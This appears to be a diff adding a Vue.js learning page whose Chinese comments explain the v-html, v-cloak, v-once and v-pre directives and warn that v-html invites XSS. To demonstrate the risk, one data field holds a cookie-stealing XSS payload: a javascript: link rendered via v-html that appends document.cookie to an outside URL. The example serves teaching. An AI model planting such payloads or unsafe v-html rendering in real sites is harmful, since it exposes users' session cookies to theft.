@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Document</title>
+    <script  type="text/javascript"  src="../vue.js"></script>
+</head>
+<!-- 
+    v-html:
+        向指定节点中渲染包含html结构的内容。
+        v-html会替换节点中所有的内容并能识别html结构
+        但 存在安全问题，容易导致xss攻击
+
+    v-cloak:
+        特殊属性，Vue实例加载后会删除v-cloak属性，主要是用于配合css解决当vue.js加载慢时，出现未渲染属性展示的问题    
+
+    v-noce:
+        在第一次动态渲染后，将属性视为静态，不会再引起改变可用于性能优化
+
+    v-pre:
+        vue跳过节点的编译过程，可加快渲染速度。
+ -->
+<body>
+    <div id="hello">
+        <h1 v-pre>v-pre 跳过渲染，加快编译</h1>
+        <h1 v-once>初始值：{{n}}</h1>
+        <h1>当前值：{{n}}</h1>
+        <button @click="n++">点击当前值+1</button>
+        <h1>你好，{{name}}</h1>
+        <div v-html="str"></div>
+        <div v-html="srt2"></div>       
+    </div>
+    <script  type="text/javascript"> 
+        Vue.config.productionTip = false;
+        new Vue({    
+            el:"#hello",    
+            data:{   
+                n : 1,
+                name : 'yy',
+                str : 'vhtml可以将字符串渲染为html结构的内容',
+                srt2 : '<a href=javascript:location.href="https://www.cn.bing.com?"+document.cookie>点击获取cookie并跳转</a>',
+            }
+        })
+    </script>
+    
+</body>
+</html>
